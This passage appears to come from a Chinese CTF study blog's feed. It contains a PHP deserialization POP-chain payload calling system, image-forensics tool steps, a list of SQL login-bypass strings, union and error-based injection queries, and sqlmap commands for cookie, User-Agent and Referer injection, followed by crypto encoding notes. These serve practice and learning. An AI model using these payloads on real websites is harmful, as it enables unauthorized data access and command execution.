class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;&#125;&#125;&#125;&#125;<br><br>改成O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="2-去掉序列化尾部"><a href="#2-去掉序列化尾部" class="headerlink" title="2.去掉序列化尾部 }"></a>2.去掉序列化尾部 }</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">newstarctf2023wee4</span>一题<br><br><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="preg-match-‘-x2F-O-d-x2F-‘-的绕过方式"><a href="#preg-match-‘-x2F-O-d-x2F-‘-的绕过方式" class="headerlink" title="preg_match(‘&#x2F;^O:\d+&#x2F;‘)的绕过方式"></a>preg_match(‘&#x2F;^O:\d+&#x2F;‘)的绕过方式</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1</span>、利用加号绕过（注意在 url 里传参时 + 要编码为 %<span class="hljs-number">2</span>B）<span class="hljs-comment">#在这个题里不行</span><br><span class="hljs-number">2</span>、serialize(array(<span class="hljs-keyword">a</span>));<span class="hljs-keyword">a</span> 为要反序列化的对象 (序列化结果开头是 <span class="hljs-keyword">a</span>，不影响作为数组元素的 $<span class="hljs-keyword">a</span> 的析构)<br></code></pre></td></tr></table></figure><h3 id="传引用改值"><a href="#传引用改值" class="headerlink" title="传引用改值"></a>传引用改值</h3>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php_learn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc_learn</title>
    <link href="/2023/10/06/ctfshow-misc-rumen/"/>
    <url>/2023/10/06/ctfshow-misc-rumen/</url>
    
    <content type="html"><![CDATA[<h1 id="一些misc的姿势"><a href="#一些misc的姿势" class="headerlink" title="一些misc的姿势"></a>一些misc的姿势</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">盲水印解码<br>excel01画图<br></code></pre></td></tr></table></figure><h1 id="ctfshow-misc入门"><a href="#ctfshow-misc入门" class="headerlink" title="ctfshow-misc入门"></a>ctfshow-misc入门</h1><h2 id="图片篇（操作基础）"><a href="#图片篇（操作基础）" class="headerlink" title="图片篇（操作基础）"></a>图片篇（操作基础）</h2><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>给一个txt文件，但真的是txt文件，010查看，发现png头，改完出flag</p><p><strong>永远不要相信后缀</strong></p><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>bpg图象格式，下载工具打开</p><h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><p>下载下来有6个txt,可以通过文件头来判断文件的类型</p><p>改文件头即可</p><h2 id="图片篇（信息附加）"><a href="#图片篇（信息附加）" class="headerlink" title="图片篇（信息附加）"></a>图片篇（信息附加）</h2><h3 id="misc5，6，7，9，15"><a href="#misc5，6，7，9，15" class="headerlink" title="misc5，6，7，9，15"></a>misc5，6，7，9，15</h3><p>使用<code>010Editor</code> ，搜索得到flag</p><h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p>foremost分离，得到flag</p><h3 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h3><p>使用<code>binwalk -e</code> 第一 <code>10E5</code> 打开就是<code>flag</code></p><h3 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h3><p>出题人意图：对图片特定数据块的考察 我们知道，png图片有四个重要的数据块，IHDR，PLTE，IDAT，IEND 本题考察的就是IDAT的数据块</p><p>通过<strong>tweakpng</strong>软件可以发现，IDAT数据块有两个，然而在图片解释器中只能解释第一个，所以显示出来的都是第一个IDAT所携带的内容 因此，删除第一个IDAT数据块即可</p><h3 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h3><p>跟上题一样，IDAT块很多，F7预览，依次删除，即可</p><h3 id="misc13"><a href="#misc13" class="headerlink" title="misc13"></a>misc13</h3><p>题目说”flag在图片结尾“</p><p>010打开，发现疑似flag的东西，脚本跑完hex解码</p><h3 id="misc14"><a href="#misc14" class="headerlink" title="misc14"></a>misc14</h3><p>binwalk分离</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=misc14.jpg <span class="hljs-attribute">of</span>=1.jpeg <span class="hljs-attribute">skip</span>=2103 <span class="hljs-attribute">bs</span>=1<br></code></pre></td></tr></table></figure><h3 id="misc16"><a href="#misc16" class="headerlink" title="misc16"></a>misc16</h3><p>binwalk分离即可</p><h3 id="misc17"><a href="#misc17" class="headerlink" title="misc17"></a>misc17</h3><p>二次分离</p><p>一开始binwalk，foremost分离无果</p><p>上zteg <code>zsteg -e &quot;extradata:0&quot; misc17.png &gt; 1.txt</code></p><p>再分离一次 <code>binwalk -e 1.txt</code></p><h3 id="misc18"><a href="#misc18" class="headerlink" title="misc18"></a>misc18</h3><p>右键属性</p><h3 id="misc19-20"><a href="#misc19-20" class="headerlink" title="misc19,20"></a>misc19,20</h3><p>exiftool</p><h3 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21</h3><p>exiftool+进制转换</p><h3 id="misc22"><a href="#misc22" class="headerlink" title="misc22"></a>misc22</h3><p>这里是缩略图隐写的方式，叫做thumbnail隐写。</p><p>exiftool -ThumbnailImage -b 文件名&gt;生成文件 </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">exiftool -ThumbnailImage -<span class="hljs-keyword">b </span>misc22.<span class="hljs-keyword">jpg </span>&gt; <span class="hljs-number">1</span>.<span class="hljs-keyword">jpg</span><br></code></pre></td></tr></table></figure><h3 id="misc23"><a href="#misc23" class="headerlink" title="misc23"></a>misc23</h3><p>exiftool</p><p>这里利用<a href="https://tool.lu/timestamp/">时间戳(Unix timestamp)转换工具 - 在线工具 (tool.lu)</a>获取时间戳</p><p>将转换后的时间戳转为16进制，拼接得到flag</p><h3 id="misc41"><a href="#misc41" class="headerlink" title="misc41"></a>misc41</h3><p>第一句提示的F001是突破点，这个位置有大量F001，看起来组成了某种形状</p><p>010打开图片，搜索F001，全部高亮！</p><h2 id="图片篇（文件结构）"><a href="#图片篇（文件结构）" class="headerlink" title="图片篇（文件结构）"></a>图片篇（文件结构）</h2>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL_injection</title>
    <link href="/2023/10/06/sqli_learn/"/>
    <url>/2023/10/06/sqli_learn/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入的一般流程"><a href="#SQL注入的一般流程" class="headerlink" title="SQL注入的一般流程"></a>SQL注入的一般流程</h2><h2 id="一些万能密码"><a href="#一些万能密码" class="headerlink" title="一些万能密码"></a>一些万能密码</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27; or 1=&#x27;</span>1<br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br>admin<br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin888</span><br><span class="hljs-string">&quot;or &quot;a&quot;=&quot;a</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">2</span>=2#<br>a<span class="hljs-string">&#x27; having 1=1#</span><br><span class="hljs-string">a&#x27;</span> having <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>2<span class="hljs-string">&#x27;=&#x27;</span>2<br><span class="hljs-string">&#x27;)or(&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4--<br>c<br>a<span class="hljs-string">&#x27;or&#x27;</span> <span class="hljs-attribute">4</span>=4--<br><span class="hljs-string">&quot;or 4=4--</span><br><span class="hljs-string">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="hljs-string">&quot;</span><span class="hljs-keyword">or</span><span class="hljs-string">&quot;=&quot;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>=1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4<br><span class="hljs-string">&#x27;OR 4=4%00</span><br><span class="hljs-string">&quot;or 4=4%00</span><br><span class="hljs-string">&#x27;</span>xor<br>admin<span class="hljs-string">&#x27; UNION Select 1,1,1 FROM admin Where &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>1<br>-1%cf<span class="hljs-string">&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="hljs-string">1</span><br><span class="hljs-string">17..admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;a 密码随便</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4/*<br>something<br><span class="hljs-string">&#x27; OR &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>admin<span class="hljs-string">&#x27; OR 4=4/*</span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>此题为ctfhub一题</p><p>根据网页显示内容输入1进行测试，发现此题可能存在SQL注入，在URL末尾使用’and 1 &#x3D; 1’和’and 1 &#x3D; 2’验证是否存在SQL注入</p><p><img src="https://img-blog.csdnimg.cn/436ba9745bc0436a8cea6da5406da126.png" alt="img"></p><p>and1 &#x3D; 2’语句正常执行，回显出错，说明此题存在SQL整数型注入</p><p><img src="https://img-blog.csdnimg.cn/850fbefa2b674dc596d39385da1e8c88.png" alt="img"></p><p>使用order by 判断字段数量，从order by 1开始,order by 3没有回显，说明只有2个字段</p><p>知道字段数量为2后，可以查看数据库位置，使用union select 1,2查看未发现数据</p><p><img src="https://img-blog.csdnimg.cn/1ef8ff41776f4f469b9b1ada817f6aaa.png" alt="img"></p><p>判断数据可能不存在数据库中，在id&#x3D;1中加入负号可以查看到不存在数据库中的数据</p><p><img src="https://img-blog.csdnimg.cn/b8d48f97b10949aaa4adff2e09b8c335.png" alt="img"></p><p>修改2为database()</p><p><img src="https://img-blog.csdnimg.cn/d2ef501425c94962b4f372c6efa93563.png" alt="img"></p><p>查看所有数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name)<span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p><img src="/2023/10/06/sqli_learn/Blog\source_posts\sqli_learn.assets\image-20230822183118550.png" alt="image-20230822183118550"></p><p>查看刚才获取到的数据库全部表名，最后在sqli数据库中发现名为flag的可疑表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/06/sqli_learn/Blog\source_posts\sqli_learn.assets\image-20230822183208812.png" alt="image-20230822183208812"></p><p>查看flag表中的全部字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/06/sqli_learn/Blog\source_posts\sqli_learn.assets\image-20230822183300575.png" alt="image-20230822183300575"></p><p>查看flag表中的全部数据，发现此题flag</p><p><img src="/2023/10/06/sqli_learn/Blog\source_posts\sqli_learn.assets\image-20230822183333043.png" alt="image-20230822183333043"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>本题与上一题基本一致，只需要处理一下单引号闭合的问题，以及用#号注释掉的问题，其他解法一致</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>三种方法extractvalue() updatexml() floor()</strong></p><p><strong>(1)extractvalue报错注入</strong>:0x7e就是~用来区分数据<br>里面用select语句，不能用union select</p><p>concat()函数<br>1.功能：将多个字符串连接成一个字符串。<br>2.语法：concat(str1,str2,…)<br>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p><p>extractvalue报错注入语句格式:</p><p><code>?id=2 and extractvalue(null,concat(0x7e,(sql语句),0x7e))</code></p><p>爆库</p><p><code>1 and extractvalue(null,concat(0x7e,(database()),0x7e))</code></p><p>爆表</p><p><code>1 and extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))</code></p><p>爆字段</p><p><code>1 and extractvalue(null,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39; limit 0,1),0x7e))</code></p><p>获取flag</p><p><code>1 and extractvalue(null,concat(0x7e,(select flag from flag limit 0,1),0x7e))</code></p><p>只能得到部分flag，需要借助mid函数来进行字符截取从而显示32位以后的数据</p><p>mid语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> mid(column_name,<span class="hljs-keyword">start</span>[,length]) <span class="hljs-keyword">from</span> table_name<br></code></pre></td></tr></table></figure><p><code>2 and extractvalue(null,concat(0x7e,mid((select flag from flag),4),0x7e))</code></p><p><strong>(2)updatexml报错注入</strong></p><p>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">sql</span>语句,<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p> <strong>(3)floor报错注入</strong></p><p>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">python sqlmap.py -u url/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-comment">--batch  #匹配</span><br>python sqlmap.py -u url/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-comment">--dbs</span><br>python sqlmap.py -u url/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> -D sqli <span class="hljs-comment">--tables</span><br>python sqlmap.py -u url/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> -D sqli -T flag <span class="hljs-comment">--columns</span><br>python sqlmap.py -u url/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> -D sqli -T flag -C flag <span class="hljs-comment">--dump</span><br></code></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>同上</p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p>方法一:抓包后在cookie中进行sql注入</p><p>方法二:sqlmap</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u url <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1&quot;</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span><br> <br>python sqlmap<span class="hljs-selector-class">.py</span> -u url <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1&quot;</span> -D sqli <span class="hljs-attr">--tables</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span><br> <br>python sqlmap<span class="hljs-selector-class">.py</span> -u url <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1&quot;</span> -D sqli -T frkadyqcec <span class="hljs-attr">--columns</span> <span class="hljs-attr">--dump</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p>方法一:抓包后在UA进行sql注入</p><p>方法二:sqlmap</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u url  <span class="hljs-attr">--level</span> <span class="hljs-number">3</span> <span class="hljs-attr">--dbs</span><br> <br>python sqlmap<span class="hljs-selector-class">.py</span> -u url  <span class="hljs-attr">--level</span> <span class="hljs-number">3</span> -D sqli <span class="hljs-attr">--tables</span><br> <br>python sqlmap<span class="hljs-selector-class">.py</span> -u url  <span class="hljs-attr">--level</span> <span class="hljs-number">3</span> -D sqli -T asqmhkqrnf <span class="hljs-attr">--columns</span> <span class="hljs-attr">--dump</span><br><br></code></pre></td></tr></table></figure><h2 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h2><p>1.用hackbar或者burp抓包注入都行</p><p>2.sqlmap</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u url  <span class="hljs-attr">--level</span> <span class="hljs-number">5</span> -<span class="hljs-selector-tag">p</span> referer  -D sqli -T qpwqsdpqwl -C nfibqdpovy <span class="hljs-attr">--dump</span><br></code></pre></td></tr></table></figure><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>用<code>/**/</code>代替空格即可</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>crypto</title>
    <link href="/2023/10/05/crypto/"/>
    <url>/2023/10/05/crypto/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto-常见编码"><a href="#Crypto-常见编码" class="headerlink" title="Crypto_常见编码"></a>Crypto_常见编码</h1><p><a href="https://blog.csdn.net/RuoLi_s/article/details/109767829">CTF常见编码及加解密（超全）-CSDN博客</a></p><p><a href="https://blog.csdn.net/yifijhjh/article/details/127638142">CTF-Crypto 密码原理及解密方法_ctffunction encrypt(n) { var aux &#x3D; forwardpass(n);-CSDN博客</a></p><p>base家族</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">base64：大小写字母，0~9，+，-,64位组成的</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">base32：Base32编码是使用32个可打印字符（字母A-Z和数字2-7）</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">base16：使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。没有=</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">base36：base36编码是使用0~9的数字，加上所有26个字母，所有的字母要不全大写，要不全小写。</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">base58：58=9个阿拉伯数字（去掉0）+24个大写字母（去掉I和O）+25小写字母（去掉l）</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">base62：Base62编码是由10个数字、26个大写英文字母和26个小写英文字母组成</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">base85：:d]&gt;JA62bf&lt;^o]!;,or.=a;i@9/17&#x27;@8oNU</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">base91:从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建base91字母：</span><br><span class="hljs-keyword"></span>​-（破折号，<span class="hljs-number">0x2D</span>）\（反斜杠，<span class="hljs-number">0x5C</span>）<span class="hljs-string">&#x27;（撇号，0x27）</span><br><span class="hljs-string">base92:比base91 多一个字符 〜</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h1 id="Crypto-古典密码"><a href="#Crypto-古典密码" class="headerlink" title="Crypto-古典密码"></a>Crypto-古典密码</h1><p>[CTF·Crypto·古典密码大全_crypto中和诗词相关的加密-CSDN博客](<a href="https://blog.csdn.net/qq_32284207/article/details/124771025?ops_request_misc=%7B%22request_id%22:%22169651735816800182764756%22,%22scm%22:%2220140713.130102334..%22%7D&amp;request_id=169651735816800182764756&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124771025-null-null.142%5Ev94%5Einsert_down1&amp;utm_term=CTF">https://blog.csdn.net/qq_32284207/article/details/124771025?ops_request_misc=%7B%22request%5Fid%22%3A%22169651735816800182764756%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169651735816800182764756&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124771025-null-null.142^v94^insert_down1&amp;utm_term=CTF</a> 古典密码&amp;spm&#x3D;1018.2226.3001.4187)</p><h1 id="常见编码及工具网站"><a href="#常见编码及工具网站" class="headerlink" title="常见编码及工具网站"></a>常见编码及工具网站</h1><h2 id="Quoted-printable编码"><a href="#Quoted-printable编码" class="headerlink" title="Quoted-printable编码"></a>Quoted-printable编码</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">例子<span class="hljs-symbol">:</span><br>=<span class="hljs-symbol">E9</span>=<span class="hljs-number">82</span>=<span class="hljs-symbol">A3</span>=<span class="hljs-symbol">E4</span>=BD=<span class="hljs-symbol">A0</span>=<span class="hljs-symbol">E4</span>=<span class="hljs-symbol">B9</span>=<span class="hljs-number">9</span>F=<span class="hljs-symbol">E5</span>=BE=<span class="hljs-number">88</span>=<span class="hljs-symbol">E6</span>=<span class="hljs-symbol">A3</span>=<span class="hljs-number">92</span>=<span class="hljs-symbol">E5</span>=<span class="hljs-number">93</span>=<span class="hljs-symbol">A6</span><br></code></pre></td></tr></table></figure><p><a href="http://www.hiencode.com/quoted.html">CTF在线工具-在线Quoted-printable编码|在线Quoted-printable编码|邮件编码|mail编码 (hiencode.com)</a></p><h2 